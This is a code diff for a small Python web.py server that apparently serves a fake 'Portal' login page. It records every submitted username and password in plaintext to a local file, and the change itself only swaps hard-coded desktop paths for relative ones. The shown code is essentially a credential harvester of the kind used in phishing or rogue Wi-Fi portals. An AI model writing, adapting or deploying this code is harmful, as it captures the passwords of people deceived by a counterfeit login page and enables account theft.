@@ -4,7 +4,7 @@ reload(sys)
 sys.setdefaultencoding("utf-8")
 
 import web
-f = open("/Users/FANGs/Desktop/Portal.html")
+f = open("./static/Portal.html")
 r = f.read()
 f.close()
 
@@ -22,7 +22,7 @@ class infor(object):
         i = web.input()['username']
         p = web.input()['password']
         print i,p
-        w = open("/Users/FANGs/Desktop/password","a")
+        w = open("./password","a")
         data = "username:"+i+" password:"+p+"\n"
         w.write(data)
         w.close()
